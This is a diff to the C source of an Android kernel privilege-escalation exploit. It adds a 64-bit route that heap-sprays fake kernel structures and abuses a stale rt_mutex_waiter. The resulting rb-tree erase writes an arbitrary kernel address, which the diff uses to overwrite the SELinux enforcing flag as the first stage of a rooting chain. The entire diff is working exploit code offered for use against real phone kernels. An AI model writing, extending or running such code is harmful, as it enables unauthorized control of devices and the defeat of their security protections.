@@ -460,6 +460,58 @@ static int check_selinux_off(void) {
   return b[0] == '0';
 }
 
+/* exp64 route: child does the futex choreography + stamp + sched_setattr
+ * trigger entirely in 64-bit (compat setsockopt is ENOSYS on PJJ110, so
+ * the exp32 32-bit stamp path is structurally dead).  The payload words
+ * mirror the heap-sprayed waiter fields from prepare_skb_payload() —
+ * tree_entry (rb parent/right/left) + pi_tree_entry + task + lock — and
+ * exp64/stack.c stamps them at STAMP_OFF into the waiter's kernel stack.
+ *
+ * NOTE: EXP64_STAMP_OFF is UNMEASURED for PJJ110 (S22U 0x60 placeholder).
+ * Until the offset is measured on-device (perf SP leak) this route is
+ * EXPERIMENTAL: a correct stamp on the wrong slot writes nothing, a wrong
+ * stamp can panic.  It also requires the kernel page spray to have
+ * succeeded (page_base/fake_* resolved). */
+static int do_exp64_fops_write(uintptr_t target) {
+  pr_info("=== exp64 route === target=0x%016zx\n", target);
+  page_base = prepare_good_kernel_page();
+  if (!page_base) {
+    pr_warning("  exp64 heap spray failed\n");
+    return 0;
+  }
+  TIMER("  exp64 heap spray done");
+
+  uint64_t exp_buffer[16];
+  memset(exp_buffer, 0, sizeof(exp_buffer));
+  /* Words correspond to the stale rt_mutex_waiter layout stamped by
+   * exp64/stack.c (see IonStack-S22U src/main.c build_exp_buffer_fops):
+   *   [0] tree_entry.__rb_parent_color = fake_fops (RED, bit0=0)
+   *   [1] tree_entry.rb_right = 0
+   *   [2] tree_entry.rb_left  = WRITE TARGET → rb_erase writes
+   *       *target = fake_fops (one-child erase via rb_set_parent)
+   *   [3..5] pi_tree_entry = 0
+   *   [6] waiter->task = fake_task
+   *   [7] waiter->lock = fake_lock
+   *   [8..9] prio/deadline = 0 (overwritten by the walk)
+   */
+  exp_buffer[0] = (uint64_t)fake_fops;
+  exp_buffer[1] = 0;
+  exp_buffer[2] = (uint64_t)data_addr(target);
+  exp_buffer[6] = (uint64_t)fake_task;
+  exp_buffer[7] = (uint64_t)fake_lock;
+
+  pr_info("exp64 payload fake_fops=%016zx fake_lock=%016zx write_target=%016zx\n",
+          fake_fops, fake_lock, exp_buffer[2]);
+
+  int ret = exp64_stack_once(exp_buffer);
+  if (ret != 0) {
+    pr_warning("exp64_stack_once failed ret=%d errno=%d\n", ret, errno);
+    return 0;
+  }
+  pr_info("exp64_stack_once ok (chain complete or exited)\n");
+  return 1;
+}
+
 static int enforce_readable(void) {
   int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
   if (efd < 0) return 0;
@@ -1008,6 +1060,16 @@ int run_exploit(int argc, char **argv) {
   timer_reset();
   TIMER("exploit start");
 
+  /* Route selection: GHOSTLOCK_ROUTE=exp64 switches the W1 write from the
+   * (PJJ110-dead) pselect path to the embedded 64-bit exp64 stage.  pselect
+   * is default. */
+  const char *route_env = getenv("GHOSTLOCK_ROUTE");
+  int use_exp64 = route_env && strcmp(route_env, "exp64") == 0;
+  if (use_exp64)
+    pr_success("route=exp64 (embedded 64-bit stage; EXP64_STAMP_OFF UNMEASURED)\n");
+  else
+    pr_info("route=pselect (default)\n");
+
   /* W1: disable SELinux before task discovery. untrusted_app may not be able
    * to read enforce while it is still enforcing, so attempt W1 regardless. */
   int selinux_ok = check_selinux_off();
@@ -1016,9 +1078,33 @@ int run_exploit(int argc, char **argv) {
       pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
     }
     TIMER("pre-W1 drain");
-    selinux_ok = retry_write_stage(
-        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
-        verify_selinux_stage, NULL, 0);
+    if (use_exp64) {
+      /* exp64 route: single-shot W1 write back + readback probe.  The real
+       * W2/W3 chain below still relies on pselect (which can't reach .data on
+       * PJJ110) — this is a diagnostic to see whether the exp64 stamp even
+       * lines up before any full-chain port. */
+      selinux_ok = do_exp64_fops_write(data_addr(SELINUX_ENFORCING));
+      if (selinux_ok) {
+        int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
+        if (efd >= 0) {
+          char ebuf[8] = {0};
+          read(efd, ebuf, sizeof(ebuf));
+          close(efd);
+          pr_info("exp64 W1 enforce readback = '%s'\n", ebuf);
+          selinux_ok = (ebuf[0] == '0');
+        } else {
+          pr_info("exp64 W1 enforce still unreadable (errno=%d)\n", errno);
+          selinux_ok = 0;
+        }
+      } else {
+        pr_warning("exp64 W1 route did not report success\n");
+        selinux_ok = 0;
+      }
+    } else {
+      selinux_ok = retry_write_stage(
+          "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
+          verify_selinux_stage, NULL, 0);
+    }
     if (!selinux_ok) {
       pr_warning("Write 1 failed\n");
       return 1;
